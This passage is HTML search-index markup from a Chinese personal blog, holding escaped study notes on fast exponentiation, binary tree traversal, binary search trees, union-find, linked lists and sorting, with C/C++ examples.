class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.344em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;×&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.89708em;&#34;&gt;&lt;span style=&#34;top:-3.4130000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mopen nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.6915428571428572em;&#34;&gt;&lt;span style=&#34;top:-2.656em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.2255000000000003em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line mtight&#34; style=&#34;border-bottom-width:0.049em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.384em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size3 size1 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.344em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter sizing reset-size3 size6&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-1.6194060000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.040594em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;col-align-l&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.540594em;&#34;&gt;&lt;span style=&#34;top:-4.676486000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;d&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.119406em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.03588em;&#34;&gt;v&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-1.6194060000000001em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:2.040594em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;非递归快速幂：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int qpow(int a, int n){
    int ans = 1;
    while(n){
        if(n&amp;amp;1)        //如果n的当前末位为1
            ans *= a;  //ans乘上当前的a
        a *= a;        //a自乘
        n &amp;gt;&amp;gt;= 1;       //n往右移一位
    }
    return ans;
}
&lt;/code&gt;&lt;/pre&gt;
">【算法】数学</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-er-cha-shu/"" data-c="
          &lt;h2 id=&#34;二叉树的存储&#34;&gt;二叉树的存储&lt;/h2&gt;
&lt;h3 id=&#34;1-顺序存储结构&#34;&gt;1. 顺序存储结构&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600843894170.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2链式存储&#34;&gt;2.链式存储&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600843945025.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;typedef struct node
{
    int data;
    struct node *lchild, *rchild;
}Bitree;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;二叉树的访问&#34;&gt;二叉树的访问&lt;/h2&gt;
&lt;h3 id=&#34;先序访问&#34;&gt;先序访问&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void preOrderTraveral(Bitree *node) //递归
{
    if(node == NULL)
    {
        return;
    }
    printf(&amp;quot;%d &amp;quot;,node-&amp;gt;data);
    preOrderTraveral(node-&amp;gt;lchild);
    preOrderTraveral(node-&amp;gt;rchild);
}


void _preOrderTraveral(Bitree *node) //非递归
{
    stack&amp;lt;Bitree*&amp;gt; s;
    Bitree *tmp_node = node;
    while(tmp_node!=NULL || !s.empty())
    {
        while(tmp_node != NULL)
        {
            printf(&amp;quot;%d &amp;quot;,tmp_node-&amp;gt;data);
            s.push(tmp_node);
            tmp_node = tmp_node-&amp;gt;lchild;
        }
        if(!s.empty())
        {
            tmp_node = s.top();
            s.pop();
            tmp_node = tmp_node-&amp;gt;rchild;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;中序访问&#34;&gt;中序访问&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void inOrderTraveral(Bitree *node)
{
    if(node == NULL)
    {
        return;
    }
    inOrderTraveral(node-&amp;gt;lchild);
    printf(&amp;quot;%d &amp;quot;,node-&amp;gt;data);
    inOrderTraveral(node-&amp;gt;rchild);
}


void _inOrderTraveral(Bitree *node)
{
    stack&amp;lt;Bitree*&amp;gt; s;
    Bitree *tmp_node = node;
    while(tmp_node!=NULL || !s.empty())
    {
        while(tmp_node != NULL)
        {
            s.push(tmp_node);
            tmp_node = tmp_node-&amp;gt;lchild;
        }
        if(!s.empty())
        {
            tmp_node = s.top();
            s.pop();
            printf(&amp;quot;%d &amp;quot;,tmp_node-&amp;gt;data);
            tmp_node = tmp_node-&amp;gt;rchild;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;后序访问&#34;&gt;后序访问&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void postOrderTraveral(Bitree *node)
{
    if(node == NULL)
    {
        return;
    }
    postOrderTraveral(node-&amp;gt;lchild);
    postOrderTraveral(node-&amp;gt;rchild);
    printf(&amp;quot;%d &amp;quot;,node-&amp;gt;data);
}


void _postOrderTraveral(Bitree *node)
{
    stack&amp;lt;Bitree*&amp;gt; s;
    Bitree *tmp_node = node, *lastVisit = NULL;
    while(tmp_node!=NULL || !s.empty())
    {
        while(tmp_node != NULL) //左节点入栈
        {
            s.push(tmp_node);
            tmp_node = tmp_node-&amp;gt;lchild;
        }
        if(!s.empty())
        {
            tmp_node = s.top();
            s.pop();
            if(tmp_node-&amp;gt;rchild==NULL || tmp_node-&amp;gt;rchild==lastVisit) //此节点右孩子为空或者已访问过，那么访问此节点
            {
                printf(&amp;quot;%d &amp;quot;,tmp_node-&amp;gt;data);
                lastVisit = tmp_node;
                tmp_node = NULL;
            }
            else
            {
                s.push(tmp_node);//如果有右孩子并且每访问过，再将此结点入栈
                tmp_node = tmp_node-&amp;gt;rchild;
            }
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;层次遍历&lt;br&gt;
二叉树的层次遍历基于广度优先搜索，&lt;font color=&#39;red&#39;&gt;在访问第n层时，一定会访问完第n-1层&lt;/font&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void levelOrder(Bitree *root)
{
    if(!root) return;
    queue&amp;lt;Bitree *&amp;gt; q;
    q.push(root);
    while(!q.empty())
    {
        Bitree tmp = q.front();
        q.pop();
        printf(&amp;quot;%d&amp;quot;,tmp-&amp;gt;data);
        if(tmp-&amp;gt;lchild) q.push(tmp.lchild);
        if(tmp-&amp;gt;rchild) q.push(tmp.rchild);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;0二叉搜索树&#34;&gt;0二叉搜索树&lt;/h2&gt;
&lt;p&gt;左子树的所有结点值均小于根结点的值；右子树的所有结点值均大于根结点的值；左子树也是二叉搜索树。&lt;/p&gt;
&lt;h3 id=&#34;二叉搜索树的构建&#34;&gt;二叉搜索树的构建&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;typedef struct TreeNode
{
    int val;
    struct TreeNode *lchild, *rchild;
}TreeNode;

void Create(TreeNode *root, int tmp)
{
    if(!root)
    {
        root = (TreeNode *)malloc(sizeof(TreeNode));
        root-&amp;gt;val = tmp;
        return;
    }
    if(root-&amp;gt;val &amp;lt; tmp)
        Create(root-&amp;gt;lchild,tmp);
    else
        Create(root-&amp;gt;rchild,tmp);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;二叉搜索树结点的删除&#34;&gt;二叉搜索树结点的删除&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;如果删除的结点只有左孩子或者只有有孩子，那么直接删除，然后把其孩子加到父节点上。&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1600996986954.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;li&gt;如果删除的结点有左孩子和有孩子，那么删除此节点后，需要将其左子树的最大结点或者右子树的最小节点替换上来。&lt;img src=&#34;https://cactusii.github.io//post-images/1600997012992.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;找到二叉搜索树两个结点的最近的双亲结点&#34;&gt;找到二叉搜索树两个结点的最近的双亲结点&lt;/h3&gt;
&lt;p&gt;利用二叉搜索树的特点，遍历整个二叉树，如果两个节点都小于当前遍历结点，那么递归到其左子树；如果两个结点都大于当前遍历结点，那么递归到其右子树上，如果一个大于一个小于当前遍历结点，那么此结点即为其最近的双亲结点。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) {
    if(root-&amp;gt;val &amp;gt; p-&amp;gt;val &amp;amp;&amp;amp; root-&amp;gt;val &amp;gt; q-&amp;gt;val)
        return lowestCommonAncestor(root-&amp;gt;left,p,q);
    else if (root-&amp;gt;val &amp;lt; p-&amp;gt;val &amp;amp;&amp;amp; root-&amp;gt;val &amp;lt; q-&amp;gt;val)
        return lowestCommonAncestor(root-&amp;gt;right,p,q);
    return root;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;二叉搜索树的中序遍历是递增顺序&lt;/p&gt;
&lt;h2 id=&#34;由中序和后序还原二叉树&#34;&gt;由中序和后序还原二叉树&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;后序中右起第一位3肯定是根结点，我们可以据此找到中序中根结点的位置rootin；&lt;/li&gt;
&lt;li&gt;中序中根结点左边就是左子树结点，右边就是右子树结点，即[左子树结点，根结点，右子树结点]，我们就可以得出左子树结点个数为int left_count = tmp - inleft;；&lt;/li&gt;
&lt;li&gt;后序中结点分布应该是：[左子树结点，右子树结点，根结点]；&lt;/li&gt;
&lt;li&gt;根据前一步确定的左子树个数，可以确定后序中左子树结点和右子树结点的范围；&lt;/li&gt;
&lt;li&gt;如果我们要前序遍历生成二叉树的话，下一层递归应该是：&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;左子树：root-&amp;gt;left = pre_order(中序左子树范围，后序左子树范围，中序序列，后序序列);；&lt;/li&gt;
&lt;li&gt;右子树：root-&amp;gt;right = pre_order(中序右子树范围，后序右子树范围，中序序列，后序序列);。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;每一层递归都要返回当前根结点root；&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;TreeNode* buildTree(vector&amp;lt;int&amp;gt;&amp;amp; inorder, vector&amp;lt;int&amp;gt;&amp;amp; postorder) {
    TreeNode *root = pre_order(0,inorder.size()-1, 0,postorder.size()-1, inorder, postorder);
    return root;
}

TreeNode *pre_order(int inleft, int inright, int postleft, int postright, vector&amp;lt;int&amp;gt; &amp;amp;inorder, vector&amp;lt;int&amp;gt;&amp;amp; postorder)
{
    if(inleft&amp;gt;inright) return NULL;
    TreeNode *root = new TreeNode(postorder[postright]);
    int tmp = inleft;
    while(inorder[tmp]!=postorder[postright]) tmp++;
    int left_count = tmp - inleft; //左子树的结点个数
    root-&amp;gt;left = pre_order(inleft,tmp-1,postleft,postleft+left_count-1,inorder,postorder);
    root-&amp;gt;right = pre_order(tmp+1,inright,postleft+left_count,postright-1,inorder,postorder);
    return root;
}
&lt;/code&gt;&lt;/pre&gt;
">【数据结构】二叉树</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-bing-cha-ji/"" data-c="
          &lt;p&gt;并查集主要用于处理一些不相交集合的问题。&lt;/p&gt;
&lt;p&gt;每个集合包含一个或多个元素，并且有一个代表元素。对于给定一个元素，可以快速找到其所属集合的代表元素，这样判断两个元素是否属于同一集合，只需要判断二者所属集合的代表元素是否一致即可。&lt;/p&gt;
&lt;p&gt;如果要合并两个集合，只需要将其中一个集合的代表元素设为另一个集合的代表元素即可。&lt;/p&gt;
&lt;p&gt;即，并查集主要应用于两个操作：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将两个集合合并&lt;/li&gt;
&lt;li&gt;查询两个元素是否属于同一个集合&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;涉及到的主要操作有两个&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;合并：把两个元素所属集合合并（前提是两个集合不相交）&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void join(int a, int b)
{
    int tmpa,tmpb;
    tmpa = find_root(a);
    tmpb = find_root(b);
    if(tmpa!=tmpb)
        root[tmpa] = tmpb;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;查找根（代表元素）：找到某一个元素的所属集合的根。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int find_root(int x)
{
    while(x!=root[x])
        x = root[x];
    return x;
}

//root[x]=y表示x的根是y，初始化时，每个元素的根都是自己
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;路径压缩&lt;/strong&gt;*&lt;br&gt;
查找根最坏的一种情况是一条常常的链，这时候查找的效率会大大降低，此时可以使用路径压缩，即将每个元素直接指向根节点 ，如下图。&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1600744618773.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们可以在查找的过程中把每个元素的父节点直接设成根节点。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int find_root(int x)
{
    int root_of_x = x; //根节点
   
   // 找到x的根节点
    while(root_of_x != root[root_of_x])
        root_of_x = root[root_of_x];
    
    //将x到root_of_x路径上的每个节点的父节点都换成根节点x的根节点
    while(x != root[x]) 
    {
        int tmp = x;
        x = root[x];
        root[tmp] = root_of_x;
    }
    return root_of_x;
}
&lt;/code&gt;&lt;/pre&gt;
">【数据结构】并查集</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-lian-biao-de-cun-chu/"" data-c="
          &lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600735871236.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h2 id=&#34;定义链表结构体&#34;&gt;定义链表结构体&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;typedef struct ListNode
{
    int val;
    struct ListNode *next;
}ListNode;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;遍历链表&#34;&gt;遍历链表&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void print(ListNode *head)
{
    for(ListNode *cursor = head; cursor; cursor = cursor-&amp;gt;next)
    {
        printf(&amp;quot;%d-&amp;gt;&amp;quot;,cursor-&amp;gt;val);
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;尾部插入&#34;&gt;尾部插入&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void lpush_back(ListNode *head, int val)
{
    ListNode *node = (ListNode*)malloc(sizeof(ListNode));
    ListNode *cursor = head;
    node-&amp;gt;val = val;
    while(cursor-&amp;gt;next) cursor = cursor-&amp;gt;next;
    cursor-&amp;gt;next = node;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;头部插入&#34;&gt;头部插入&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void lpush_front(ListNode **head, int val)
{
    ListNode *node = (ListNode*)malloc(sizeof(ListNode));
    node-&amp;gt;val = val;
    node-&amp;gt;next =*head;
    *head = node;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;头部删除&#34;&gt;头部删除&lt;/h2&gt;
&lt;h2 id=&#34;删除指定节点&#34;&gt;删除指定节点&lt;/h2&gt;
">【数据结构】链表的存储</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/pai-xu-suan-fa/"" data-c="
          &lt;p&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1600700055304.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://cactusii.github.io//post-images/1620640106953.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;稳定排序&#34;&gt;稳定排序&lt;/h2&gt;
&lt;h3 id=&#34;1直接插入排序-on2&#34;&gt;1.直接插入排序 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;O(n^{2})&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void insSort(int *arr,int n)
{
    for(int i=0;i&amp;lt;n;i++)
    {
        int tmp=arr[i];
        int j=i-1;
        while(j&amp;gt;=0&amp;amp;&amp;amp;tmp&amp;lt;arr[j])
        {
            arr[j+1]=arr[j];
            j--;
        }
        arr[j+1]=tmp;
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;2冒泡排序-on2&#34;&gt;2.冒泡排序 &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;O(n^{2})&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.064108em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
